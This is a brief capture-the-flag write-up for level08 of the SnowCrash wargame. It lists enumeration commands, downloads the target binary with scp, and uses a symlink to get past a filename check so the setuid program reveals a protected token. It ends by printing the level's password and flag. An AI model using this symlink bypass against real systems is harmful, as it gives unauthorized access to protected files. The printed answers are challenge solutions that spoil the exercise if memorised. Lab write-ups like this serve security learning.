## Project README: Finding flag08

Our routine: 
```bash
ls -la
find / -user flag08 -print 2>/dev/null
```
We decompiled the file after we dowloaded with command:
```bash
scp -P 4343 level08@localhost:/home/user/level08/level08 ~
```

We saw that the program was checking the name of the file.
To do so, we created a **symlink** and run programe with this **symlink**

Command line :

```bash
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/te
level08@SnowCrash:~$ ./level08 /tmp/te
```
- Next step: using it we find the password for flag08 : **quif5eloekouj29ke0vouxean**
- Last step, we run getflas as flag08 et get : **25749xKZ8L7DkSCwJkT9dyv6f**

And VOILA
